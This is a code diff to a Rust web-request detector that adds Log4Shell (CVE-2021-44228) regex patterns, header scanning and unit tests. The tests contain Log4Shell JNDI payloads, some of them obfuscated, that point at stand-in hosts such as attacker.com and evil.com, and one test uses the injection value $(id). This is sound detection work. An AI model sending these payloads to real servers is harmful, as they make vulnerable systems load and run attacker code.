@@ -34,6 +34,40 @@ use super::{Detector, Signal};
 /// Stateless command-injection detector.
 pub struct CommandInjectionDetector;
 
+/// 2026-05-08 GAP-008 — Log4Shell (CVE-2021-44228) patterns.
+/// Checked **before** the baseline cmdi patterns and emit at
+/// **score 60** (Critical-RCE / known-CVE tier — one tier above
+/// baseline cmdi). Justification: CVSS 10.0, active in the wild,
+/// pattern specificity makes FP essentially zero on real traffic.
+///
+/// Headers are scanned (User-Agent, Referer, Authorization,
+/// Cookie, X-Api-Version, X-Real-IP, X-Forwarded-For,
+/// X-Requested-With) because active exploitation predominantly
+/// arrives in those rather than URL/body.
+static LOG4SHELL_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
+    [
+        // Direct ${jndi:<scheme>://...} — canonical Log4Shell.
+        // Scheme allowlist covers every documented exploitation
+        // primitive (LDAP/RMI/DNS/etc.).
+        r"(?i)\$\{jndi\s*:\s*(?:ldap|ldaps|rmi|dns|nis|iiop|corba|nds|http|https)\s*:",
+        // Bare ${jndi: without scheme — defense-in-depth.
+        r"(?i)\$\{jndi\s*:",
+        // Nested obfuscation: ${${::-j}${::-n}${::-d}${::-i}:...}
+        // Requires the suspicious ${${...} nesting with letters
+        // j, n, d, i appearing in inner expressions in order
+        // followed by `:`. Bare ${HOME} envvars don't match
+        // because there's no nested ${${...}.
+        r"(?i)\$\{[^}]*\$\{[^}]*j[^}]*\}[^}]*\$\{[^}]*n[^}]*\}[^}]*\$\{[^}]*d[^}]*\}[^}]*\$\{[^}]*i[^}]*\}[^}]*:",
+        // Case-folding obfuscation: ${${lower:j}ndi:...}
+        // Catches the ${${(lower|upper|env|sys|date):X}...} shape,
+        // which is unique to Log4j substitution lookups.
+        r"(?i)\$\{[^}]*\$\{(?:lower|upper|env|sys|date)\s*:[^}]*\}[^}]*\}",
+    ]
+    .iter()
+    .map(|p| Regex::new(p).expect("log4shell regex compiles"))
+    .collect()
+});
+
 static CMDI_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
     [
         // Subshell forms: $(cmd), `cmd`, ${cmd}.
@@ -95,11 +129,54 @@ impl Detector for CommandInjectionDetector {
             check(&decoded_body, "body", &mut signals);
         }
 
+        // 2026-05-08 GAP-008 — Log4Shell payloads frequently
+        // arrive in headers (UA, Referer, custom auth/version
+        // headers). Scan a conservative allowlist of common
+        // headers; broader header scans risk header_injection
+        // overlap.
+        for name in HEADER_SCAN_ALLOWLIST {
+            if let Some(val) = req.headers.get(*name).and_then(|v| v.to_str().ok()) {
+                check(val, name, &mut signals);
+                check(&super::url_decode(val), name, &mut signals);
+            }
+        }
+
         signals
     }
 }
 
+/// Header allowlist for Log4Shell payload scanning. Scoped to
+/// fields commonly logged by application frameworks (Spring,
+/// Tomcat, log4j patterns) — broadening risks header_injection
+/// overlap on every request.
+const HEADER_SCAN_ALLOWLIST: &[&str] = &[
+    "user-agent",
+    "referer",
+    "x-api-version",
+    "x-forwarded-for",
+    "x-real-ip",
+    "authorization",
+    "cookie",
+    "x-requested-with",
+];
+
 fn check(input: &str, field: &str, signals: &mut Vec<Signal>) {
+    // GAP-008 (2026-05-08) — Log4Shell first; score 60 (Critical
+    // RCE / known-CVE tier). Same field tag as baseline cmdi so
+    // the audit log + by-class counter stay coherent — operators
+    // grep for "${jndi:" in audit if they need to differentiate.
+    for re in LOG4SHELL_PATTERNS.iter() {
+        if re.is_match(input) {
+            signals.push(Signal {
+                score: 60,
+                tag: "command_injection".into(),
+                field: field.into(),
+            });
+            return;
+        }
+    }
+    // Baseline cmdi patterns; score 50 (high-confidence
+    // injection tier).
     for re in CMDI_PATTERNS.iter() {
         if re.is_match(input) {
             signals.push(Signal {
@@ -226,4 +303,127 @@ mod tests {
     // not user input). Operators using template-style variables
     // in URLs can disable this class via /api/detectors.
     positive!(cmdi_brace_var_user_dot,   "/api?v=${user.name}");
+
+    // ============================================================
+    // GAP-008 (2026-05-08) — Log4Shell coverage
+    // ============================================================
+
+    // Log4Shell direct ${jndi:<scheme>://...} — score 60 group.
+    positive!(log4shell_ldap_url,        "/?x=${jndi:ldap://attacker.com/a}");
+    positive!(log4shell_rmi_url,         "/?x=${jndi:rmi://attacker.com/a}");
+    positive!(log4shell_dns_url,         "/?x=${jndi:dns://attacker.com/a}");
+    // Bare ${jndi:` (no scheme) — second-line defense.
+    positive!(log4shell_bare,            "/?x=${jndi:foo}");
+    // Nested obfuscation ${${::-j}${::-n}${::-d}${::-i}:ldap://...}
+    positive!(log4shell_nested_obfusc,
+        "/?x=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}");
+    // Case-folding obfuscation ${${lower:j}ndi:rmi://...}
+    positive!(log4shell_case_fold,
+        "/?x=${${lower:j}ndi:rmi://evil.com/a}");
+    positive!(log4shell_env_lookup,
+        "/?x=${${env:HOME:-j}ndi:rmi://evil.com/a}");
+
+    // Verify the score is 60 (not 50) for Log4Shell hits.
+    #[test]
+    fn log4shell_emits_score_60_not_baseline_cmdi() {
+        let d = CommandInjectionDetector;
+        let (m, u, h, b) = view_with_uri("/?x=${jndi:ldap://evil.com/a}");
+        let req = make_view(&m, &u, &h, &b);
+        let signals = d.inspect(&req);
+        let log4_signal = signals
+            .iter()
+            .find(|s| s.tag == "command_injection")
+            .expect("Log4Shell payload should fire cmdi");
+        assert_eq!(
+            log4_signal.score, 60,
+            "Log4Shell tier should emit score 60 (not baseline cmdi 50)",
+        );
+    }
+
+    #[test]
+    fn baseline_cmdi_emits_score_50() {
+        let d = CommandInjectionDetector;
+        let (m, u, h, b) = view_with_uri("/?x=$(id)");
+        let req = make_view(&m, &u, &h, &b);
+        let signals = d.inspect(&req);
+        let cmdi_signal = signals
+            .iter()
+            .find(|s| s.tag == "command_injection")
+            .expect("baseline cmdi should fire");
+        assert_eq!(
+            cmdi_signal.score, 50,
+            "baseline cmdi tier should emit score 50",
+        );
+    }
+
+    // Header scan — Log4Shell payloads in User-Agent / Referer /
+    // Authorization. Active exploitation primarily uses these.
+    #[test]
+    fn log4shell_in_user_agent_caught() {
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let mut h = http::HeaderMap::new();
+        h.insert(
+            "user-agent",
+            "${jndi:ldap://attacker.example/a}".parse().unwrap(),
+        );
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        let signals = d.inspect(&req);
+        assert!(
+            signals.iter().any(|s| s.tag == "command_injection" && s.score == 60),
+            "Log4Shell in UA must catch at score 60",
+        );
+    }
+
+    #[test]
+    fn log4shell_in_referer_caught() {
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let mut h = http::HeaderMap::new();
+        h.insert("referer", "${jndi:rmi://evil/x}".parse().unwrap());
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
+    }
+
+    #[test]
+    fn log4shell_in_x_api_version_caught() {
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let mut h = http::HeaderMap::new();
+        h.insert("x-api-version", "${jndi:ldap://x/y}".parse().unwrap());
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
+    }
+
+    // Negative — plain envvar template strings must NOT match
+    // Log4Shell. ${HOME}, ${USER}, ${PATH} are legitimate shell-
+    // template substitutions that some apps echo into URL/body.
+    #[test]
+    fn plain_envvar_brace_does_not_match_log4shell() {
+        let d = CommandInjectionDetector;
+        let (m, u, h, b) = view_with_uri("/?p=${HOME}/dir");
+        let req = make_view(&m, &u, &h, &b);
+        let signals = d.inspect(&req);
+        // It MAY match the baseline cmdi `${VAR}` pattern (score 50)
+        // but must NOT match Log4Shell (score 60).
+        assert!(
+            signals.iter().all(|s| s.score != 60),
+            "plain envvar must not match Log4Shell tier",
+        );
+    }
+
+    #[test]
+    fn legit_template_does_not_match_log4shell() {
+        let d = CommandInjectionDetector;
+        let (m, u, h, b) = view_with_uri("/?p=${USER}");
+        let req = make_view(&m, &u, &h, &b);
+        let signals = d.inspect(&req);
+        assert!(signals.iter().all(|s| s.score != 60));
+    }
 }
